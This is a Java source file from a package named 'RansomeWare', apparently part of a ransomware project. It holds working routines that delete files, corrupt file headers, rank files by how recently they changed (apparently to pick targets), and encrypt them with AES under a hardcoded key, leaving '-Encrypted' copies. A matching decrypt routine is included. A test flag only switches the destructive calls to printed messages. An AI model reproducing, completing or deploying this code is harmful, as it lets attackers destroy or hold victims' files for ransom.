package RansomeWare;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Date;
import java.util.concurrent.TimeUnit;

public class JwareUtils {

    static void deleteFile(File f){
        if(Const.TEST) {
            System.out.println("Deleting : " + f.getAbsolutePath());
            return ;
        }
        f.delete();
    }

    /***
     * Writes some bytes in the file header.....
     * @param f
     * @throws Exception
     */
    static void corruptFile(File f) throws Exception {
        if(Const.TEST) {
            System.out.println("Corrupting : " + f.getAbsolutePath());
            return ;
        }
        RandomAccessFile rf = new RandomAccessFile(f, "rw");
        rf.seek(0);
        byte[] head = new byte[]{'a', 'Z', '1', '.', 't'};
        rf.write(head);
    }

    static double calculateBeta(File file) {
        long lastModified = file.lastModified();
        Date lastModDate = new Date(lastModified);

        //recency
        //working out how to score it
        long currentTimeMillis = System.currentTimeMillis();
        Date current = new Date(currentTimeMillis);

        Date BUCKET_1 = new Date(currentTimeMillis- TimeUnit.DAYS.toMillis(1));
        Date BUCKET_2 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(5));
        Date BUCKET_3 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(10));
        Date BUCKET_4 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(30));
        Date BUCKET_5 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(90));

        double BUCKET_1_SCORE = 1;
        double BUCKET_2_SCORE = 0.9;
        double BUCKET_3_SCORE = 0.7;
        double BUCKET_4_SCORE = 0.4;
        double BUCKET_5_SCORE = 0.1;

        double p = (lastModDate.after(BUCKET_1)) ? BUCKET_1_SCORE:
                (lastModDate.after(BUCKET_2)) ? BUCKET_2_SCORE:
                        (lastModDate.after(BUCKET_3)) ? BUCKET_3_SCORE:
                                (lastModDate.after(BUCKET_4)) ? BUCKET_4_SCORE:
                                        (lastModDate.after(BUCKET_5)) ? BUCKET_5_SCORE: 0.0;

        //calculate frequency
        //a = time since last accessed in hrs
        long hoursDiff = (currentTimeMillis - lastModified)/(1000*60*60);
        double a = (double) hoursDiff;

        //the decay constant is ln2/30 (30 days for decay)
        double lambda = Math.log(2) / 30;

        double beta = p * Math.exp(-lambda * a);
        return beta;
    }


    public  static IFileEncToStr getInstance() throws UnsupportedEncodingException {
        return new AES("W6kG$Uv+;XM7HK#!", ")B5C*\\)<$xhXdq$d");
    }

    public  static IFileEncToStr getInstance(String key, String initVector) throws UnsupportedEncodingException {
        return new AES(key, initVector);
    }

    public  static IFileEncToStr getInstance(byte [] key, byte[] initVector) throws UnsupportedEncodingException {
        return new AES(key, initVector);
    }
}



class AES implements IAES, IFileEncToStr{
    private byte [] key;
    private byte [] initVector;

    //reads a whole file into memory
    private static byte [] readFile(File inputFile ) throws Exception {
        FileInputStream in = new FileInputStream(inputFile);
        byte[] inputBytes = new byte[(int) inputFile.length()];
        in.read(inputBytes);
        in.close();
        return inputBytes;
    }

    /***
     * Writes to output file...
     * @param outputFile
     * @param b
     * @throws Exception
     */
    private static void writeFile(File outputFile, byte [] b) throws Exception{
        FileOutputStream out = new FileOutputStream(outputFile);
        out.write(b);
        out.close();
    }

    /***
     * Initializes a cipher either by init Vecto & key.
     * @param mode
     * @param initvector
     * @param key
     * @return
     * @throws NoSuchPaddingException
     * @throws NoSuchAlgorithmException
     * @throws InvalidAlgorithmParameterException
     * @throws InvalidKeyException
     */
    private static Cipher initCipher(int mode, byte [] initvector, byte [] key) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException {
        IvParameterSpec iv = new IvParameterSpec(initvector );
        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(mode, skeySpec, iv);
        return cipher;
    }

    AES() throws UnsupportedEncodingException {
        this("W6kG$Uv+;XM7HK#!", ")B5C*\\)<$xhXdq$d");
    }

    AES(String key, String initVector) throws UnsupportedEncodingException {
        this(key.getBytes("UTF-8"), initVector.getBytes("UTF-8"));
    }

    AES(byte[] key, byte[] initVector){
        this.key = key; this.initVector = initVector;
    }

    @Override
    public byte[] encrypt(byte[] inputBytes) throws Exception {
        //init cipher
        Cipher cipher = initCipher(Cipher.ENCRYPT_MODE, initVector, key);
        return   cipher.doFinal(inputBytes);
    }

    @Override
    public byte[] decrypt(byte[] inputBytes) throws Exception {
        //init cipher
        Cipher cipher = initCipher(Cipher.DECRYPT_MODE, initVector, key);
        return   cipher.doFinal(inputBytes);
    }

    public  String encrypt(File inputFile) throws Exception {
        if(Const.TEST){
            System.out.println(" Encrypting : " + inputFile.getAbsolutePath());
            return "";
        }
        byte[] encrypted = encrypt(readFile(inputFile));
        writeFile(new File(inputFile + "-Encrypted"), Base64.getEncoder().encode(encrypted));
        return Base64.getEncoder().encodeToString(encrypted);
    }

    public   String decrypt(File encryptedFile) throws Exception {
        byte[] original = decrypt(Base64.getDecoder().decode(readFile(encryptedFile)));
        String file = encryptedFile.toString();
        int index = file.lastIndexOf("-Encrypted");
        String originalName = file.substring(0, index);
        File outputFile = new File(originalName);

        writeFile(outputFile, (original));
        return new String(original);
    }

    public static void  main(String [] args) throws Exception {
        String s = JwareUtils.getInstance().decrypt(new File("G:\\PROJECTS\\gethub\\jware\\.\\test.enc-Encrypted"));
        System.out.println(s);
    }

}